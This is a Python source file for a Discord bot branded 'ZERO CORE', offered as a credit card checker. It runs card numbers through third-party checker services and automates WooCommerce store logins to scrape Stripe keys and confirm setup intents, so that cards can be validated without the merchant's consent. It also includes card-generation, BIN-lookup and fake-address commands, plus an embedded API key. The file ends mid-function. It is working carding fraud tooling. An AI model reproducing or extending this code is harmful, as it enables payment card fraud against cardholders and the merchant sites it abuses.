"""
ZERO CORE - Discord Credit Card Checker Bot
All-in-one professional bot with Telegram scraping, mass checking, and multiple gateways
Author: ZERO CORE Development Team
Version: 6.5 ULTIMATE - Enhanced Edition (FIXED)
"""

import discord
from discord.ext import commands, tasks
from discord import app_commands
import aiohttp
import asyncio
import json
import sqlite3
from datetime import datetime, timedelta
from typing import Optional, List, Dict, Tuple
import re
import random
import hashlib
import secrets
from colorama import Fore, Style, init
import logging
from collections import defaultdict
import time
import io
import requests
from bs4 import BeautifulSoup
import uuid

# Initialize
init(autoreset=True)
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger('ZeroCore')

# Bot configuration
INTENTS = discord.Intents.default()
INTENTS.message_content = True
INTENTS.members = True

# ZERO CORE Branding
BRAND_NAME = "⚡ ZERO CORE"
BRAND_COLOR = 0x00FFFF  # Cyan
BRAND_EMOJI = "💎"
DEV_NAME = "NXTPLAYZYT"

# Owner ID - Updated
OWNER_ID = 1035564557143392307

# ==================== DATABASE CLASS ====================

class Database:
    def __init__(self, db_path: str = "zerocore.db"):
        self.conn = sqlite3.connect(db_path, check_same_thread=False)
        self.cursor = self.conn.cursor()
        self.init_tables()
        self.migrate_database()
    
    def migrate_database(self):
        """Migrate old database to new schema"""
        try:
            # Check if registered_date column exists
            self.cursor.execute("PRAGMA table_info(users)")
            columns = [column[1] for column in self.cursor.fetchall()]
            
            if 'registered_date' not in columns:
                logger.info("Migrating database: Adding registered_date column")
                self.cursor.execute("ALTER TABLE users ADD COLUMN registered_date TEXT")
                self.conn.commit()
            
            if 'last_check_time' not in columns:
                logger.info("Migrating database: Adding last_check_time column")
                self.cursor.execute("ALTER TABLE users ADD COLUMN last_check_time TEXT")
                self.conn.commit()
            
            if 'banned' not in columns:
                logger.info("Migrating database: Adding banned column")
                self.cursor.execute("ALTER TABLE users ADD COLUMN banned INTEGER DEFAULT 0")
                self.conn.commit()
            
            if 'ban_reason' not in columns:
                logger.info("Migrating database: Adding ban_reason column")
                self.cursor.execute("ALTER TABLE users ADD COLUMN ban_reason TEXT")
                self.conn.commit()
                
            logger.info("Database migration completed successfully")
        except Exception as e:
            logger.error(f"Migration error: {e}")
    
    def init_tables(self):
        # Users table
        self.cursor.execute("""
            CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                username TEXT,
                auth_level TEXT DEFAULT 'free',
                auth_expiry TEXT,
                credits INTEGER DEFAULT 0,
                total_checks INTEGER DEFAULT 0,
                successful_checks INTEGER DEFAULT 0,
                declined_checks INTEGER DEFAULT 0,
                registered_date TEXT,
                last_check_time TEXT,
                banned INTEGER DEFAULT 0,
                ban_reason TEXT
            )
        """)
        
        # Admin table
        self.cursor.execute("""
            CREATE TABLE IF NOT EXISTS admins (
                user_id INTEGER PRIMARY KEY,
                username TEXT,
                added_date TEXT,
                added_by INTEGER
            )
        """)
        
        # Auth keys table
        self.cursor.execute("""
            CREATE TABLE IF NOT EXISTS auth_keys (
                key TEXT PRIMARY KEY,
                auth_level TEXT,
                duration_days INTEGER,
                credits INTEGER,
                created_by INTEGER,
                created_date TEXT,
                redeemed_by INTEGER,
                redeemed_date TEXT,
                used INTEGER DEFAULT 0
            )
        """)
        
        # Authorized users table (persistent)
        self.cursor.execute("""
            CREATE TABLE IF NOT EXISTS authorized_users (
                user_id INTEGER PRIMARY KEY,
                username TEXT,
                auth_level TEXT,
                authorized_by INTEGER,
                authorized_date TEXT,
                permanent INTEGER DEFAULT 1
            )
        """)
        
        self.conn.commit()
    
    def register_user(self, user_id: int, username: str) -> bool:
        try:
            # Check if user already exists
            self.cursor.execute("SELECT user_id FROM users WHERE user_id = ?", (user_id,))
            if self.cursor.fetchone():
                return False  # User already registered
            
            self.cursor.execute(
                "INSERT INTO users (user_id, username, registered_date) VALUES (?, ?, ?)",
                (user_id, username, datetime.now().isoformat())
            )
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Registration error: {e}")
            return False
    
    def get_user(self, user_id: int) -> Optional[dict]:
        try:
            self.cursor.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
            row = self.cursor.fetchone()
            if row:
                return {
                    'user_id': row[0],
                    'username': row[1],
                    'auth_level': row[2] if len(row) > 2 else 'free',
                    'auth_expiry': row[3] if len(row) > 3 else None,
                    'credits': row[4] if len(row) > 4 else 0,
                    'total_checks': row[5] if len(row) > 5 else 0,
                    'successful_checks': row[6] if len(row) > 6 else 0,
                    'declined_checks': row[7] if len(row) > 7 else 0,
                    'registered_date': row[8] if len(row) > 8 else None,
                    'last_check_time': row[9] if len(row) > 9 else None,
                    'banned': row[10] if len(row) > 10 else 0,
                    'ban_reason': row[11] if len(row) > 11 else None
                }
            return None
        except Exception as e:
            logger.error(f"Get user error: {e}")
            return None
    
    def is_admin(self, user_id: int) -> bool:
        self.cursor.execute("SELECT user_id FROM admins WHERE user_id = ?", (user_id,))
        return self.cursor.fetchone() is not None
    
    def add_admin(self, user_id: int, username: str, added_by: int) -> bool:
        try:
            self.cursor.execute(
                "INSERT OR REPLACE INTO admins (user_id, username, added_date, added_by) VALUES (?, ?, ?, ?)",
                (user_id, username, datetime.now().isoformat(), added_by)
            )
            self.conn.commit()
            return True
        except:
            return False
    
    def remove_admin(self, user_id: int) -> bool:
        try:
            self.cursor.execute("DELETE FROM admins WHERE user_id = ?", (user_id,))
            self.conn.commit()
            return True
        except:
            return False
    
    def authorize_user(self, user_id: int, username: str, auth_level: str, authorized_by: int) -> bool:
        try:
            # First, register user if not exists
            self.cursor.execute("SELECT user_id FROM users WHERE user_id = ?", (user_id,))
            if not self.cursor.fetchone():
                self.register_user(user_id, username)
            
            self.cursor.execute(
                "INSERT OR REPLACE INTO authorized_users (user_id, username, auth_level, authorized_by, authorized_date) VALUES (?, ?, ?, ?, ?)",
                (user_id, username, auth_level, authorized_by, datetime.now().isoformat())
            )
            # Also update users table
            expiry = (datetime.now() + timedelta(days=365*10)).isoformat()  # 10 years for permanent
            self.cursor.execute(
                "UPDATE users SET auth_level = ?, auth_expiry = ? WHERE user_id = ?",
                (auth_level, expiry, user_id)
            )
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Authorization error: {e}")
            return False
    
    def is_authorized(self, user_id: int) -> bool:
        self.cursor.execute("SELECT user_id FROM authorized_users WHERE user_id = ?", (user_id,))
        return self.cursor.fetchone() is not None
    
    def get_authorized_level(self, user_id: int) -> Optional[str]:
        self.cursor.execute("SELECT auth_level FROM authorized_users WHERE user_id = ?", (user_id,))
        result = self.cursor.fetchone()
        return result[0] if result else None
    
    def update_check_stats(self, user_id: int, success: bool):
        try:
            self.cursor.execute(
                "UPDATE users SET total_checks = total_checks + 1, successful_checks = successful_checks + ?, declined_checks = declined_checks + ?, last_check_time = ? WHERE user_id = ?",
                (1 if success else 0, 0 if success else 1, datetime.now().isoformat(), user_id)
            )
            self.conn.commit()
        except:
            pass
    
    def ban_user(self, user_id: int, reason: str):
        self.cursor.execute(
            "UPDATE users SET banned = 1, ban_reason = ? WHERE user_id = ?",
            (reason, user_id)
        )
        self.conn.commit()
    
    def unban_user(self, user_id: int):
        self.cursor.execute(
            "UPDATE users SET banned = 0, ban_reason = NULL WHERE user_id = ?",
            (user_id,)
        )
        self.conn.commit()

# ==================== GATEWAY CHECKERS ====================

class VBVChecker:
    """VBV API Checker"""
    @staticmethod
    async def check(card: str) -> dict:
        try:
            parts = card.split('|')
            if len(parts) < 4:
                return {"success": False, "message": "Invalid card format", "gateway": "VBV"}
            
            cc, month, year, cvv = parts[0], parts[1], parts[2], parts[3]
            
            async with aiohttp.ClientSession() as session:
                url = f"https://api.voidapi.xyz/v2/vbv?key=VDX-SHA2X-NZ0RS-O7HAM&card={cc}|{month}|{year}|{cvv}"
                async with session.get(url, timeout=30) as response:
                    if response.status == 200:
                        data = await response.json()
                        result_msg = data.get('result', '').lower()
                        
                        success_keywords = [
                            "authenticate_successful",
                            "authenticate_attempt_successful",
                            "authenticate_passed",
                            "authenticate_approved",
                            "authenticate_verified"
                        ]
                        
                        is_approved = any(keyword in result_msg for keyword in success_keywords)
                        
                        return {
                            "success": is_approved,
                            "message": data.get('result', 'Unknown'),
                            "gateway": "VBV",
                            "response": data
                        }
                    else:
                        return {"success": False, "message": f"API Error: {response.status}", "gateway": "VBV"}
        except Exception as e:
            return {"success": False, "message": f"Error: {str(e)}", "gateway": "VBV"}

class StripeChecker:
    """Stripe Regular Checker"""
    @staticmethod
    async def check(card: str) -> dict:
        try:
            parts = card.split('|')
            if len(parts) < 4:
                return {"success": False, "message": "Invalid card format", "gateway": "Stripe"}
            
            cc, month, year, cvv = parts[0], parts[1], parts[2], parts[3]
            
            async with aiohttp.ClientSession() as session:
                # Use a Stripe API endpoint (you can replace with your own)
                url = "https://api.stripe.com/v1/tokens"
                headers = {
                    "Authorization": "Bearer pk_live_your_key_here",
                    "Content-Type": "application/x-www-form-urlencoded"
                }
                data = {
                    "card[number]": cc,
                    "card[exp_month]": month,
                    "card[exp_year]": year,
                    "card[cvc]": cvv
                }
                
                async with session.post(url, headers=headers, data=data, timeout=30) as response:
                    result_data = await response.json()
                    
                    if response.status == 200 and "id" in result_data:
                        return {
                            "success": True,
                            "message": "Card validated successfully",
                            "gateway": "Stripe",
                            "response": result_data
                        }
                    else:
                        error_msg = result_data.get('error', {}).get('message', 'Unknown error')
                        return {
                            "success": False,
                            "message": error_msg,
                            "gateway": "Stripe",
                            "response": result_data
                        }
        except Exception as e:
            return {"success": False, "message": f"Error: {str(e)}", "gateway": "Stripe"}

class StripeAutoChecker:
    """Stripe Auto Auth Checker - Complete Implementation"""
    
    def __init__(self, domain: str, username: str = "test@test.com", password: str = "test123"):
        self.domain = domain.rstrip('/')
        self.username = username
        self.password = password
        self.session = requests.Session()
        self.stripe_pk = None

    def _parse_value(self, data: str, start: str, end: str) -> str:
        try:
            start_pos = data.index(start) + len(start)
            end_pos = data.index(end, start_pos)
            return data[start_pos:end_pos]
        except ValueError:
            return "None"

    def login(self):
        """Login and extract Stripe public key."""
        login_url = f"{self.domain}/my-account/"
        headers = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "accept-language": "en-US,en;q=0.9",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
        }
        
        res = self.session.get(login_url, headers=headers)
        soup = BeautifulSoup(res.text, 'html.parser')
        
        login_form = soup.find('form', {'class': 'login'})
        if not login_form:
            login_form = soup.find('form', {'id': lambda x: x and 'login' in x.lower()}) or \
                        soup.find('form', {'action': lambda x: x and 'login' in x.lower()}) or \
                        soup.find('form', {'method': 'post'})
            
            if not login_form:
                raise Exception("Could not find login form")
        
        hidden_inputs = login_form.find_all('input', {'type': 'hidden'})
        form_data = {input.get('name'): input.get('value') for input in hidden_inputs if input.get('name')}
        
        form_data.update({
            'username': self.username,
            'password': self.password,
            'login': 'Log in',
            'woocommerce-login-nonce': form_data.get('woocommerce-login-nonce', ''),
            '_wp_http_referer': form_data.get('_wp_http_referer', '/my-account/'),
        })
        
        headers = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "content-type": "application/x-www-form-urlencoded",
            "origin": self.domain,
            "referer": login_url,
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
        }
        
        res = self.session.post(login_url, headers=headers, data=form_data)
        res = self.session.get(f"{self.domain}/my-account/add-payment-method/")
        
        match = re.search(r'wc_stripe_params\s*=\s*({[^}]+})', res.text)
        if match:
            try:
                params = json.loads(match.group(1))
                self.stripe_pk = params.get('key')
            except:
                pass
                
        if not self.stripe_pk:
            pk_match = re.search(r'pk_(live|test)_[0-9a-zA-Z]+', res.text)
            if pk_match:
                self.stripe_pk = pk_match.group(0)
                
        if not self.stripe_pk:
            raise Exception("Could not extract Stripe public key")

    def get_setup_nonce(self):
        headers = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "accept-language": "en-US,en;q=0.9",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
        }

        res = self.session.get(
            f"{self.domain}/my-account/add-payment-method/",
            headers=headers
        )
        nonce = self._parse_value(res.text, '"createAndConfirmSetupIntentNonce":"', '"')
        return nonce

    def create_payment_method(self, card_number: str, exp_month: str, exp_year: str, cvv: str):
        headers = {
            "accept": "application/json",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://js.stripe.com",
            "referer": "https://js.stripe.com/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
        }

        exp_year = exp_year[-2:] if len(exp_year) > 2 else exp_year

        data = {
            "type": "card",
            "card[number]": card_number,
            "card[cvc]": cvv,
            "card[exp_year]": exp_year,
            "card[exp_month]": exp_month,
            "billing_details[address][postal_code]": "99501",
            "billing_details[address][country]": "US",
            "payment_user_agent": "stripe.js/b85ba7b837; stripe-js-v3/b85ba7b837; payment-element; deferred-intent",
            "key": self.stripe_pk,
            "_stripe_version": "2024-06-20",
        }

        res = requests.post(
            "https://api.stripe.com/v1/payment_methods",
            headers=headers,
            data=data
        )

        if res.status_code == 200:
            pm_id = res.json().get('id')
            return pm_id
        else:
            return None

    def confirm_setup_intent(self, payment_method_id: str, nonce: str):
        headers = {
            "accept": "*/*",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": self.domain,
            "referer": f"{self.domain}/my-account/add-payment-method/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
            "x-requested-with": "XMLHttpRequest",
        }

        data = {
            "action": "create_and_confirm_setup_intent",
            "wc-stripe-payment-method": payment_method_id,
            "wc-stripe-payment-type": "card",
            "_ajax_nonce": nonce,
        }

        res = self.session.post(
            f"{self.domain}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent",
            headers=headers,
            data=data
        )
        return res.text

    async def check(self, card: str, site: str = "https://epicalarc.com") -> dict:
        try:
            parts = card.split('|')
            if len(parts) < 4:
                return {"success": False, "message": "Invalid card format", "gateway": "Stripe Auth"}
            
            cc, month, year, cvv = parts[0], parts[1], parts[2], parts[3]
            
            # Try API first
            try:
                async with aiohttp.ClientSession() as session:
                    url = f"https://newrp.vercel.app/check?cc={card}&site={site}"
                    async with session.get(url, timeout=30) as response:
                        if response.status == 200:
                            data = await response.json()
                            success = data.get('status') == 'success' or 'succeeded' in str(data).lower()
                            return {
                                "success": success,
                                "message": data.get('message', str(data)),
                                "gateway": "Stripe Auth",
                                "response": data
                            }
            except:
                pass
            
            # Fallback to direct implementation
            checker = StripeAutoChecker(site)
            result = await asyncio.get_event_loop().run_in_executor(
                None, checker.check_card, cc, month, year, cvv
            )
            
            return {
                "success": result.get('success', False),
                "message": result.get('message', 'Unknown error'),
                "gateway": "Stripe Auth",
                "response": result
            }
            
        except Exception as e:
            return {"success": False, "message": f"Error: {str(e)}", "gateway": "Stripe Auth"}
    
    def check_card(self, card_number: str, exp_month: str, exp_year: str, cvv: str) -> dict:
        try:
            self.login()
            nonce = self.get_setup_nonce()
            pm_id = self.create_payment_method(card_number, exp_month, exp_year, cvv)
            if not pm_id:
                return {
                    "success": False,
                    "message": "Failed to create payment method",
                    "card": f"{card_number}|{exp_month}|{exp_year}|{cvv}"
                }
            
            result = self.confirm_setup_intent(pm_id, nonce)
            
            # Parse response
            success_keywords = ['success', 'succeeded', 'approved', 'confirmed']
            is_success = any(keyword in result.lower() for keyword in success_keywords) and 'error' not in result.lower()
            
            return {
                "success": is_success,
                "message": result[:100] if len(result) > 100 else result,
                "payment_method_id": pm_id,
                "card": f"{card_number}|{exp_month}|{exp_year}|{cvv}"
            }
            
        except Exception as e:
            return {
                "success": False,
                "message": str(e),
                "card": f"{card_number}|{exp_month}|{exp_year}|{cvv}"
            }

class PayPalChecker:
    """PayPal Checker"""
    @staticmethod
    async def check(card: str) -> dict:
        try:
            parts = card.split('|')
            if len(parts) < 4:
                return {"success": False, "message": "Invalid card format", "gateway": "PayPal"}
            
            # PayPal checker implementation here
            # This is a placeholder - replace with actual PayPal API
            return {
                "success": False,
                "message": "PayPal checker not fully implemented",
                "gateway": "PayPal"
            }
        except Exception as e:
            return {"success": False, "message": f"Error: {str(e)}", "gateway": "PayPal"}

class BraintreeChecker:
    """Braintree CVV Auth Checker"""
    @staticmethod
    async def check(card: str, proxy: Optional[str] = None) -> dict:
        try:
            async with aiohttp.ClientSession() as session:
                url = f"https://chk.vkrm.site/?card={card}"
                if proxy:
                    url += f"&proxy={proxy}"
                
                async with session.get(url, timeout=30) as response:
                    if response.status == 200:
                        data = await response.json()
                        success = data.get('status') == 'approved' or 'approved' in str(data).lower()
                        return {
                            "success": success,
                            "message": data.get('message', str(data)),
                            "gateway": "Braintree",
                            "response": data
                        }
                    else:
                        return {"success": False, "message": f"API Error: {response.status}", "gateway": "Braintree"}
        except Exception as e:
            return {"success": False, "message": f"Error: {str(e)}", "gateway": "Braintree"}

class SquareChecker:
    """Square Checker"""
    @staticmethod
    async def check(card: str) -> dict:
        try:
            parts = card.split('|')
            if len(parts) < 4:
                return {"success": False, "message": "Invalid card format", "gateway": "Square"}
            
            # Square checker implementation
            return {
                "success": False,
                "message": "Square checker not fully implemented",
                "gateway": "Square"
            }
        except Exception as e:
            return {"success": False, "message": f"Error: {str(e)}", "gateway": "Square"}

class StripeChargerChecker:
    """Stripe Charger Checker"""
    @staticmethod
    async def check(card: str) -> dict:
        try:
            parts = card.split('|')
            if len(parts) < 4:
                return {"success": False, "message": "Invalid card format", "gateway": "Stripe Charger"}
            
            # Stripe Charger implementation
            return {
                "success": False,
                "message": "Stripe Charger not fully implemented",
                "gateway": "Stripe Charger"
            }
        except Exception as e:
            return {"success": False, "message": f"Error: {str(e)}", "gateway": "Stripe Charger"}

# ==================== UTILITY FUNCTIONS ====================

async def bin_lookup(bin_number: str) -> dict:
    """BIN Lookup using antipublic API"""
    try:
        async with aiohttp.ClientSession() as session:
            url = f"https://bins.antipublic.cc/bins/{bin_number}"
            async with session.get(url, timeout=10) as response:
                if response.status == 200:
                    return await response.json()
                else:
                    return {"error": f"API returned status {response.status}"}
    except Exception as e:
        return {"error": str(e)}

async def generate_cards(bin_number: str, count: int = 10) -> List[str]:
    """Generate cards using API"""
    try:
        async with aiohttp.ClientSession() as session:
            url = f"https://drlabapis.onrender.com/api/ccgenerator?bin={bin_number}&count={count}"
            async with session.get(url, timeout=30) as response:
                if response.status == 200:
                    text = await response.text()
                    cards = [line.strip() for line in text.split('\n') if line.strip()]
                    return cards
                else:
                    return []
    except:
        return []

async def fake_address(country_code: str = "us") -> dict:
    """Generate fake address using randomuser API"""
    try:
        async with aiohttp.ClientSession() as session:
            url = f"https://randomuser.me/api/?nat={country_code}"
            async with session.get(url, timeout=10) as response:
                if response.status == 200:
                    data = await response.json()
                    if data.get('results'):
                        user = data['results'][0]
                        location = user.get('location', {})
                        return {
                            "name": f"{user['name']['first']} {user['name']['last']}",
                            "gender": user.get('gender', '').title(),
                            "street": f"{location.get('street', {}).get('number', '')} {location.get('street', {}).get('name', '')}",
                            "city": location.get('city', ''),
                            "state": location.get('state', ''),
                            "postcode": str(location.get('postcode', '')),
                            "country": location.get('country', ''),
                            "phone": user.get('phone', ''),
                            "email": user.get('email', '')
                        }
    except:
        pass
    return {}

def get_country_flag(country_code: str) -> str:
    """Convert country code to flag emoji"""
    flags = {
        "US": "🇺🇸", "GB": "🇬🇧", "CA": "🇨🇦", "AU": "🇦🇺",
        "IN": "🇮🇳", "BR": "🇧🇷", "SA": "🇸🇦", "AE": "🇦🇪",
        "PH": "🇵🇭", "MY": "🇲🇾", "NL": "🇳🇱", "DE": "🇩🇪",
        "FR": "🇫🇷", "IT": "🇮🇹", "ES": "🇪🇸", "MX": "🇲🇽"
    }
    return flags.get(country_code.upper(), "🌍")

# ==================== EMBED BUILDER ====================

class EmbedBuilder:
    @staticmethod
    def create_approved_embed(card: str, gateway: str, response: str, bin_info: dict, time_taken: float) -> discord.Embed:
        embed = discord.Embed(
            title="✅ 𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿",
            color=0x00ff00,
            timestamp=datetime.now()
        )
        
        embed.add_field(
            name="𝘾𝙖𝙧𝙙",
            value=f"⤷ `{card}`",
            inline=False
        )
        
        embed.add_field(
            name="𝙂𝙖𝙩𝙚𝙬𝙖𝙮",
            value=f"⤷ `{gateway}`",
            inline=True
        )
        
        embed.add_field(
            name="𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚",
            value=f"⤷ `{response[:50]}`",
            inline=True
        )
        
        if bin_info and 'error' not in bin_info:
            info = f"{bin_info.get('brand', 'Unknown')} - {bin_info.get('type', 'Unknown')} - {bin_info.get('level', 'Unknown')}"
            country = f"{bin_info.get('country_name', 'Unknown')} {bin_info.get('country_flag', '🌍')}"
            bank = bin_info.get('bank', 'Unknown')
            
            embed.add_field(name="𝙄𝙣𝙛𝙤", value=f"⤷ `{info}`", inline=False)
            embed.add_field(name="𝘽𝙖𝙣𝙠", value=f"⤷ `{bank}`", inline=True)
            embed.add_field(name="𝘾𝙤𝙪𝙣𝙩𝙧𝙮", value=f"⤷ `{country}`", inline=True)
        
        embed.add_field(name="𝙏𝙞𝙢𝙚", value=f"⤷ `{time_taken:.2f}s`", inline=True)
        
        embed.set_footer(text=f"{BRAND_NAME} • Dev: {DEV_NAME}")
        
        return embed
    
    @staticmethod
    def create_declined_embed(card: str, gateway: str, response: str, bin_info: dict, time_taken: float) -> discord.Embed:
        embed = discord.Embed(
            title="❌ 𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿",
            color=0xff0000,
            timestamp=datetime.now()
        )
        
        embed.add_field(
            name="𝘾𝙖𝙧𝙙",
            value=f"⤷ `{card}`",
            inline=False
        )
        
        embed.add_field(
            name="𝙂𝙖𝙩𝙚𝙬𝙖𝙮",
            value=f"⤷ `{gateway}`",
            inline=True
        )
        
        embed.add_field(
            name="𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚",
            value=f"⤷ `{response[:50]}`",
            inline=True
        )
        
        if bin_info and 'error' not in bin_info:
            info = f"{bin_info.get('brand', 'Unknown')} - {bin_info.get('type', 'Unknown')}"
            embed.add_field(name="𝙄𝙣𝙛𝙤", value=f"⤷ `{info}`", inline=False)
        
        embed.add_field(name="𝙏𝙞𝙢𝙚", value=f"⤷ `{time_taken:.2f}s`", inline=True)
        
        embed.set_footer(text=f"{BRAND_NAME} • Dev: {DEV_NAME}")
        
        return embed
    
    @staticmethod
    def create_mass_result_embed(approved: int, declined: int, errors: int, total: int, time_taken: float, username: str) -> discord.Embed:
        embed = discord.Embed(
            title=f"{BRAND_EMOJI} 𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸 𝗖𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝗱",
            color=BRAND_COLOR,
            timestamp=datetime.now()
        )
        
        success_rate = (approved / total * 100) if total > 0 else 0
        
        embed.add_field(name="📊 Total", value=f"`{total}`", inline=True)
        embed.add_field(name="✅ Approved", value=f"`{approved}`", inline=True)
        embed.add_field(name="❌ Declined", value=f"`{declined}`", inline=True)
        embed.add_field(name="⚠️ Errors", value=f"`{errors}`", inline=True)
        embed.add_field(name="📈 Success Rate", value=f"`{success_rate:.1f}%`", inline=True)
        embed.add_field(name="⏱️ Time", value=f"`{time_taken:.1f}s`", inline=True)
        
        embed.set_footer(text=f"Checked by {username} • {BRAND_NAME}")
        
        return embed

# ==================== BOT SETUP ====================

bot = commands.Bot(command_prefix="!", intents=INTENTS)
bot.db = Database()

@bot.event
async def on_ready():
    logger.info(f"✅ {bot.user} is online!")
    logger.info(f"Servers: {len(bot.guilds)}")
    
    try:
        synced = await bot.tree.sync()
        logger.info(f"Synced {len(synced)} commands")
    except Exception as e:
        logger.error(f"Failed to sync commands: {e}")
    
    await bot.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.watching,
            name=f"{BRAND_NAME} | /help"
        )
    )

# ==================== COMMANDS ====================

@bot.tree.command(name="register", description="📝 Register your account")
async def register(interaction: discord.Interaction):
    """Register user"""
    user = bot.db.get_user(interaction.user.id)
    
    if user:
        embed = discord.Embed(
            title="Already Registered",
            description="Your account is already registered!",
            color=0xffa500
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    
    success = bot.db.register_user(interaction.user.id, interaction.user.name)
    
    if success:
        embed = discord.Embed(
            title=f"{BRAND_EMOJI} Welcome to ZERO CORE!",
            description="Registration successful! Use `/help` to see available commands.",
            color=BRAND_COLOR
        )
        embed.add_field(name="User", value=interaction.user.name, inline=True)
        embed.add_field(name="Plan", value="FREE", inline=True)
        embed.set_footer(text=BRAND_NAME)
        await interaction.response.send_message(embed=embed, ephemeral=True)
    else:
        embed = discord.Embed(
            title="Error",
            description="Registration failed. You may already be registered.",
            color=0xff0000
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.tree.command(name="profile", description="👤 View your profile")
async def profile(interaction: discord.Interaction):
    """View user profile"""
    user = bot.db.get_user(interaction.user.id)
    
    if not user:
        embed = discord.Embed(
            title="Not Registered",
            description="Use `/register` first!",
            color=0xff0000
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    
    is_admin = bot.db.is_admin(interaction.user.id)
    is_authorized = bot.db.is_authorized(interaction.user.id)
    
    embed = discord.Embed(
        title=f"{BRAND_EMOJI} Profile: {user['username']}",
        color=BRAND_COLOR,
        timestamp=datetime.now()
    )
    
    # Status badges
    badges = []
    if is_admin:
        badges.append("👑 ADMIN")
    if is_authorized:
        badges.append("✅ AUTHORIZED")
    if user['auth_level'] == 'premium':
        badges.append("💎 PREMIUM")
    elif user['auth_level'] == 'vip':
        badges.append("⭐ VIP")
    
    if badges:
        embed.add_field(name="Status", value=" | ".join(badges), inline=False)
    
    embed.add_field(name="Plan", value=user['auth_level'].upper(), inline=True)
    embed.add_field(name="Credits", value=str(user['credits']), inline=True)
    embed.add_field(name="Total Checks", value=str(user['total_checks']), inline=True)
    embed.add_field(name="Approved", value=str(user['successful_checks']), inline=True)
    embed.add_field(name="Declined", value=str(user['declined_checks']), inline=True)
    
    success_rate = (user['successful_checks'] / user['total_checks'] * 100) if user['total_checks'] > 0 else 0
    embed.add_field(name="Success Rate", value=f"{success_rate:.1f}%", inline=True)
    
    embed.set_footer(text=BRAND_NAME)
    
    await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.tree.command(name="bin", description="🔍 BIN Lookup")
@app_commands.describe(bin_number="First 6 digits of card")
async def bin_lookup_cmd(interaction: discord.Interaction, bin_number: str):
    """BIN lookup command"""
    await interaction.response.defer()
    
    if len(bin_number) < 6:
        embed = discord.Embed(
            title="Invalid BIN",
            description="BIN must be at least 6 digits",
            color=0xff0000
        )
        await interaction.followup.send(embed=embed, ephemeral=True)
        return
    
    bin_info = await bin_lookup(bin_number[:6])
    
    if 'error' in bin_info:
        embed = discord.Embed(
            title="Error",
            description=f"BIN lookup failed: {bin_info['error']}",
            color=0xff0000
        )
        await interaction.followup.send(embed=embed, ephemeral=True)
        return
    
    embed = discord.Embed(
        title=f"{BRAND_EMOJI} BIN Lookup: {bin_number[:6]}",
        color=BRAND_COLOR,
        timestamp=datetime.now()
    )
    
    embed.add_field(name="Brand", value=bin_info.get('brand', 'Unknown'), inline=True)
    embed.add_field(name="Type", value=bin_info.get('type', 'Unknown'), inline=True)
    embed.add_field(name="Level", value=bin_info.get('level', 'Unknown'), inline=True)
    embed.add_field(name="Bank", value=bin_info.get('bank', 'Unknown'), inline=False)
    embed.add_field(
        name="Country",
        value=f"{bin_info.get('country_name', 'Unknown')} {bin_info.get('country_flag', '🌍')}",
        inline=True
    )
    
    embed.set_footer(text=BRAND_NAME)
    
    await interaction.followup.send(embed=embed)

@bot.tree.command(name="gen", description="🎲 Generate cards")
@app_commands.describe(
    bin_number="BIN to generate from",
    count="Number of cards (1-50)"
)
async def gen_cmd(interaction: discord.Interaction, bin_number: str, count: int = 10):
    """Generate cards command"""
    await interaction.response.defer()
    
    if count < 1 or count > 50:
        embed = discord.Embed(
            title="Invalid Count",
            description="Count must be between 1 and 50",
            color=0xff0000
        )
        await interaction.followup.send(embed=embed, ephemeral=True)
        return
    
    cards = await generate_cards(bin_number, count)
    
    if not cards:
        embed = discord.Embed(
            title="Error",
            description="Failed to generate cards",
            color=0xff0000
        )
        await interaction.followup.send(embed=embed, ephemeral=True)
        return
    
    # Get BIN info
    bin_info = await bin_lookup(bin_number[:6])
    
    embed = discord.Embed(
        title=f"{BRAND_EMOJI} Generated {len(cards)} Cards",
        description=f"**BIN:** {bin_number}\n**Brand:** {bin_info.get('brand', 'Unknown')}",
        color=BRAND_COLOR,
        timestamp=datetime.now()
    )
    
    cards_text = '\n'.join(f"`{card}`" for card in cards[:20])
    if len(cards) > 20:
        cards_text += f"\n... and {len(cards) - 20} more"
    
    embed.add_field(name="Cards", value=cards_text, inline=False)
    embed.set_footer(text=BRAND_NAME)
    
    # Send as file if too many
    if len(cards) > 20:
        file_content = '\n'.join(cards)
        file = discord.File(io.BytesIO(file_content.encode()), filename=f"generated_{bin_number}.txt")
